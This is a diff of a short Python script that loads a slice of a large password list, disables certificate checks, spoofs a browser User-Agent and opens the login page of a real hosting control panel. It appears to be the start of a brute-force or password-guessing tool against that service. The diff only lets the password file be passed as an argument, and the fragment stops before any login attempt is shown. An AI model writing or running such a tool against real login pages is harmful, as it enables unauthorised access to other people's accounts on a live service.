@@ -1,7 +1,7 @@
 import requests,re,sys,time,urllib3,random,string
 urllib3.disable_warnings()
 start=int(sys.argv[1]); count=int(sys.argv[2])
-pw=[l.rstrip('\n') for l in open('pw10m.txt')][start:start+count]
+pw=[l.rstrip('\n') for l in open(sys.argv[3] if len(sys.argv)>3 else 'pw10m.txt')][start:start+count]
 UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124 Safari/537.36'
 s=requests.Session(); s.trust_env=False
 r=s.get('https://cp.sprinthost.ru/auth/login',headers={'User-Agent':UA},verify=False,timeout=20)
